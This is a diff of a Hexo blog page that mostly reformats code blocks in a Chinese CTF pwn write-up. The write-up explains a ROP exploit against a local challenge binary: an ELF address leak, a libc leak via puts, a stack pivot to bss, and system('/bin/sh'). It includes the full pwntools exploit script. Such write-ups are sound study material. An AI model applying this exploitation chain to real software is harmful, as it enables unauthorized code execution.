@@ -153,7 +153,7 @@
     <div><a class="about  hasFriend  site_url"  href="/about">About</a><a style="width: 50%"  class="friends">Friends</a></div>
 </div>
 <input type="hidden" id="yelog_site_posts_number" value="13">
-<input type="hidden" id="yelog_site_word_count" value="11.9k">
+<input type="hidden" id="yelog_site_word_count" value="12.3k">
 <div style="display: none">
     <span id="busuanzi_value_site_uv"></span>
     <span id="busuanzi_value_site_pv"></span>
@@ -313,7 +313,7 @@
         
         <a  class="All PWN题 "
            href="/2020/07/03/HITCON-training-hacknote-UAF/"
-           data-tag="UAF,ctfwiki"
+           data-tag="ctfwiki,UAF"
            data-author="" >
             <span class="post-title" title="HITCON-training-hacknote(UAF)">HITCON-training-hacknote(UAF)</span>
             <span class="post-date" title="2020-07-03 10:43:46">2020/07/03</span>
@@ -400,7 +400,7 @@
     </div>
     <div class="article-meta">
         
-        <span>Count:1.6k</span>
+        <span>Count:1.7k</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -463,32 +463,92 @@
 <p>input your name:aaaaaaaa    &emsp;#输入name<br>welcome!aaaaaaaa�9�ùU</p>
 </blockquote>
 <p>于是我们就来接收它，没准它就是该题给我们的恩赐（故意泄露出一个地址）。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p.sendlineafter(<span class="string">'name:'</span>,<span class="string">'a'</span>*<span class="number">8</span>)</span><br><span class="line">p.recvuntil(<span class="string">'a'</span>*<span class="number">8</span>)</span><br><span class="line">temp=p.recvuntil(<span class="string">'\n'</span>,drop=<span class="literal">True</span>)</span><br><span class="line">leak=u64(temp.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'leak_addr is:'</span>+hex(leak)</span><br></pre></td></tr></table></figure>
-
+<pre><code class="python">p.sendlineafter(&#39;name:&#39;,&#39;a&#39;*8)
+p.recvuntil(&#39;a&#39;*8)
+temp=p.recvuntil(&#39;\n&#39;,drop=True)
+leak=u64(temp.ljust(8,&#39;\x00&#39;))
+print &#39;leak_addr is:&#39;+hex(leak)</code></pre>
 <p>通过debug查看，发现该地址确实是泄露的elf地址，通过vmmap命令得知elf文件的基址，发现两者之间偏移为 0x9c0。于是在每一次运行该程序时，我们就可以通过该泄露出来的地址来得知elf文件的装载地址image_base。</p>
 <blockquote>
 <p>image_base = leak_addr - 0x9c0</p>
 </blockquote>
 <p>得到了程序的装载基址后一切都看起来顺利很多了。我们接下来去寻找gadgets， 找到pop rdi;ret ，以及 pop rsi;pop r15;ret 。<br>由于本题开启了ASLR，所以找到的地址都是偏移比如0xfd3。但我们已经有了image_base地址，因此pop rdi;ret 的最终内存地址就是 image_base + 0xfd3                 。其他gadgets的地址也类似。<br>于是得到以下地址：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pop_rdi=image_base+<span class="number">0xfd3</span></span><br><span class="line">pop_rsi_r15=image_base+<span class="number">0xfd1</span></span><br><span class="line">pop_rbp=image_base+<span class="number">0xa20</span></span><br><span class="line">leave_ret=image_base+<span class="number">0xba6</span></span><br><span class="line">bss=image_base+<span class="number">0x202800</span></span><br><span class="line">puts_plt=image_base+ elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got=image_base+ elf.got[<span class="string">'puts'</span>]</span><br><span class="line">read_mbuf=image_base+elf.symbols[<span class="string">'read_mbuf'</span>]</span><br></pre></td></tr></table></figure>
+<pre><code class="python">pop_rdi=image_base+0xfd3
+pop_rsi_r15=image_base+0xfd1
+pop_rbp=image_base+0xa20
+leave_ret=image_base+0xba6
+bss=image_base+0x202800
+puts_plt=image_base+ elf.plt[&#39;puts&#39;]
+puts_got=image_base+ elf.got[&#39;puts&#39;]
+read_mbuf=image_base+elf.symbols[&#39;read_mbuf&#39;]</code></pre>
 <p>所以本题很明显就是构造ROP链咯。<br>接下去该泄露libc地址了。<br>当要我们输入count of the game 的时候，我们输入“1”，使得只执行一遍流程，无需循环。如果输入“2”的话，则要求输入两遍answer的值。<br>我们这里选择输入“1”。那么只执行一遍流程的话，就要把payload一次性给构造好喽<br>在输入answer时进行溢出，这样构造payload1：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload1=<span class="string">'a'</span>*(<span class="number">0x30</span>+<span class="number">0x8</span>)   <span class="comment">#paddings</span></span><br><span class="line">payload1+=p64(pop_rdi)+p64(puts_got)+p64(puts_plt)  <span class="comment">#通过puts函数泄漏puts的地址</span></span><br></pre></td></tr></table></figure>
+<pre><code class="python">payload1=&#39;a&#39;*(0x30+0x8)   #paddings
+payload1+=p64(pop_rdi)+p64(puts_got)+p64(puts_plt)  #通过puts函数泄漏puts的地址</code></pre>
 <p>通过rdi传递参数。执行完puts的plt函数后，返回地址填的是pop rdi，继续传参，执行下一步骤read：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload1+=p64(pop_rdi)+p64(bss)+p64(pop_rsi_r15)+p64(<span class="number">0x1000</span>)+p64(<span class="number">0</span>)+p64(read_mbuf)</span><br></pre></td></tr></table></figure>
+<pre><code class="python">payload1+=p64(pop_rdi)+p64(bss)+p64(pop_rsi_r15)+p64(0x1000)+p64(0)+p64(read_mbuf)</code></pre>
 <p>它这里利用的是程序自定义的read_mbuf函数，为什么要用read_mbuf函数而不用read函数呢？因为read函数要三个参数，而read_mbuf函数只需要两个参数，而我们只有rdi和rsi的gadgets，所以只可以控制rdi和rsi这两个寄存器,所以就选择两个参数的read_mbuf函数喽。这里把r15的值设为0，是有什么特殊的用途吗？然而并不是，因为我们只能找到pop_rsi_r15这个gadget，而找不到单独的pop_rsi。所以在这个gadget中我们只利用到了rsi的功能，r15的值无用处所以就索性填为0啦。<br>两个参数设置好以后，调用read_mbuf函数。 read_mbuf(bss,0x1000)  ，即准备往bss上读取0x1000的数据。<br>但payload1还没完，read_mbuf函数的返回地址填为pop_rbp：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload1+=p64(pop_rbp)+p64(bss)+p64(leave_ret)</span><br></pre></td></tr></table></figure>
+<pre><code class="python">payload1+=p64(pop_rbp)+p64(bss)+p64(leave_ret)  </code></pre>
 <p>这套是栈迁移的典型操作。使得rbp指向bss，开始诱拐rbp了。然后leave;ret，使rsp和rbp都转移到bss段上。<br>puts函数地址这样来接收：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">temp1=p.recvuntil(<span class="string">'\n'</span>,drop=<span class="literal">True</span>)     <span class="comment">#接收到\x0a为止</span></span><br><span class="line">puts_addr=u64(temp1.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc_base= puts_addr - libc.symbols[<span class="string">'puts'</span>]   <span class="comment">#计算libc基址</span></span><br></pre></td></tr></table></figure>
+<pre><code class="python">temp1=p.recvuntil(&#39;\n&#39;,drop=True)     #接收到\x0a为止
+puts_addr=u64(temp1.ljust(8,&#39;\x00&#39;))
+libc_base= puts_addr - libc.symbols[&#39;puts&#39;]   #计算libc基址</code></pre>
 <p>知道了libc基址后，就可以在libc库里求得system函数地址，binsh字符串的地址， 另外还有 exit函数的地址。    </p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">system_addr=libc_base+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh_addr=libc_base+libc.search(<span class="string">'/bin/sh\x00'</span>).next()</span><br><span class="line">exit_addr=libc_base+libc.symbols[<span class="string">'exit'</span>]</span><br></pre></td></tr></table></figure>
-
+<pre><code class="python">system_addr=libc_base+libc.symbols[&#39;system&#39;]
+binsh_addr=libc_base+libc.search(&#39;/bin/sh\x00&#39;).next()
+exit_addr=libc_base+libc.symbols[&#39;exit&#39;]</code></pre>
 <p>到这里还没结束，我们payload1中既然调用了read_mbuf函数，那总要等待我们传一些数据进去啊。<br>所以构造payload2，由read_mbuf函数读取到bss段上：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload2=p64(<span class="number">0</span>)+p64(pop_rdi)+p64(binsh_addr)+p64(system_addr)</span><br></pre></td></tr></table></figure>
+<pre><code class="python">payload2=p64(0)+p64(pop_rdi)+p64(binsh_addr)+p64(system_addr)</code></pre>
 <p>后面很容易理解，给system函数传参数为binsh字符串地址。<br>我看原WP在执行system函数之后还执行了如下 exit(0) 的操作</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload2+=p64(pop_rdi)+p64(<span class="number">0</span>)+p64(exit_addr)</span><br></pre></td></tr></table></figure>
+<pre><code class="python">payload2+=p64(pop_rdi)+p64(0)+p64(exit_addr)</code></pre>
 <p>这样子是让源程序正常退出吗？我试过不加这句，发现exp仍然可以成功执行，说明这一句可以省略。<br>所以payload2被read读取到bss段上存储起来。  而我们在read完后对栈进行了迁移，使得rsp刚好指向payload2处。自然而然就执行system函数了。<br>我现在只是不知道他哪里找来的bss地址（比如本题的0x202800），以前做过几题也都是一样，他们找的都是超出了IDA可以查得到的范围外的bss地址（本题bss地址可查到的最大是0x20201F）。懂了，以后找bss地址时就胆大一点，勇闯“bss无人区”。  （开玩笑）望知晓的师傅能留个言，我还是太菜了，继续学习。</p>
-<h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp:"></a>完整exp:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">p=process(<span class="string">'./uninit'</span>)</span><br><span class="line">elf=ELF(<span class="string">'./uninit'</span>)</span><br><span class="line">libc=ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"><span class="comment"># context.log_level='debug'</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'name:'</span>,<span class="string">'a'</span>*<span class="number">8</span>)</span><br><span class="line">p.recvuntil(<span class="string">'a'</span>*<span class="number">8</span>)</span><br><span class="line">temp=p.recvuntil(<span class="string">'\n'</span>,drop=<span class="literal">True</span>)</span><br><span class="line">leak=u64(temp.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'leak_addr is:'</span>+hex(leak)</span><br><span class="line">image_base=leak<span class="number">-0x9c0</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'image_base is :'</span>+hex(image_base)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">pop_rdi=image_base+<span class="number">0xfd3</span></span><br><span class="line">pop_rsi_r15=image_base+<span class="number">0xfd1</span></span><br><span class="line">pop_rbp=image_base+<span class="number">0xa20</span></span><br><span class="line">leave_ret=image_base+<span class="number">0xba6</span></span><br><span class="line">bss=image_base+<span class="number">0x202800</span></span><br><span class="line">puts_plt=image_base+ elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got=image_base+ elf.got[<span class="string">'puts'</span>]</span><br><span class="line">read_mbuf=image_base+elf.symbols[<span class="string">'read_mbuf'</span>]</span><br><span class="line"></span><br><span class="line">payload1=<span class="string">'a'</span>*(<span class="number">0x30</span>+<span class="number">0x8</span>)</span><br><span class="line">payload1+=p64(pop_rdi)+p64(puts_got)+p64(puts_plt)   </span><br><span class="line">payload1+=p64(pop_rdi)+p64(bss)+p64(pop_rsi_r15)+p64(<span class="number">0x1000</span>)+p64(<span class="number">0</span>)+p64(read_mbuf)</span><br><span class="line">payload1+=p64(pop_rbp)+p64(bss)+p64(leave_ret)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'game:'</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendafter(<span class="string">'Answer:'</span>,payload1)</span><br><span class="line">temp1=p.recvuntil(<span class="string">'\n'</span>,drop=<span class="literal">True</span>)</span><br><span class="line">puts_addr=u64(temp1.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"puts_addr is :"</span>+hex(puts_addr)</span><br><span class="line">libc_base= puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_base is :"</span>+hex(libc_base)</span><br><span class="line"></span><br><span class="line">system_addr=libc_base+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh_addr=libc_base+libc.search(<span class="string">'/bin/sh\x00'</span>).next()</span><br><span class="line">exit_addr=libc_base+libc.symbols[<span class="string">'exit'</span>]</span><br><span class="line"></span><br><span class="line">payload2=p64(<span class="number">0</span>)+p64(pop_rdi)+p64(binsh_addr)+p64(system_addr)</span><br><span class="line"><span class="comment"># payload2+=p64(pop_rdi)+p64(0)+p64(exit_addr)  #这句可省略</span></span><br><span class="line">time.sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp:"></a>完整exp:</h3><pre><code class="python">#coding=utf8
+from pwn import *
+import time
+p=process(&#39;./uninit&#39;)
+elf=ELF(&#39;./uninit&#39;)
+libc=ELF(&#39;./libc.so.6&#39;)
+# context.log_level=&#39;debug&#39;
 
+p.sendlineafter(&#39;name:&#39;,&#39;a&#39;*8)
+p.recvuntil(&#39;a&#39;*8)
+temp=p.recvuntil(&#39;\n&#39;,drop=True)
+leak=u64(temp.ljust(8,&#39;\x00&#39;))
+print &#39;leak_addr is:&#39;+hex(leak)
+image_base=leak-0x9c0
+print &#39;image_base is :&#39;+hex(image_base)
+pause()
+
+pop_rdi=image_base+0xfd3
+pop_rsi_r15=image_base+0xfd1
+pop_rbp=image_base+0xa20
+leave_ret=image_base+0xba6
+bss=image_base+0x202800
+puts_plt=image_base+ elf.plt[&#39;puts&#39;]
+puts_got=image_base+ elf.got[&#39;puts&#39;]
+read_mbuf=image_base+elf.symbols[&#39;read_mbuf&#39;]
+
+payload1=&#39;a&#39;*(0x30+0x8)
+payload1+=p64(pop_rdi)+p64(puts_got)+p64(puts_plt)   
+payload1+=p64(pop_rdi)+p64(bss)+p64(pop_rsi_r15)+p64(0x1000)+p64(0)+p64(read_mbuf)
+payload1+=p64(pop_rbp)+p64(bss)+p64(leave_ret)
+
+p.sendlineafter(&#39;game:&#39;,&#39;1&#39;)
+p.sendafter(&#39;Answer:&#39;,payload1)
+temp1=p.recvuntil(&#39;\n&#39;,drop=True)
+puts_addr=u64(temp1.ljust(8,&#39;\x00&#39;))
+print &quot;puts_addr is :&quot;+hex(puts_addr)
+libc_base= puts_addr - libc.symbols[&#39;puts&#39;]
+print &quot;libc_base is :&quot;+hex(libc_base)
+
+system_addr=libc_base+libc.symbols[&#39;system&#39;]
+binsh_addr=libc_base+libc.search(&#39;/bin/sh\x00&#39;).next()
+exit_addr=libc_base+libc.symbols[&#39;exit&#39;]
+
+payload2=p64(0)+p64(pop_rdi)+p64(binsh_addr)+p64(system_addr)
+# payload2+=p64(pop_rdi)+p64(0)+p64(exit_addr)  #这句可省略
+time.sleep(0.1)
+p.sendline(payload2)
+p.interactive()</code></pre>
 <p>最后贴上原wp (其中不仅有pwn，还有其他题型的wp，良心了)：</p>
 <blockquote>
 <p><a href="https://zhouyetao.yzzaccept.top/index.php/2019/09/16/hctf2019.html" target="_blank" rel="noopener">https://zhouyetao.yzzaccept.top/index.php/2019/09/16/hctf2019.html</a></p>
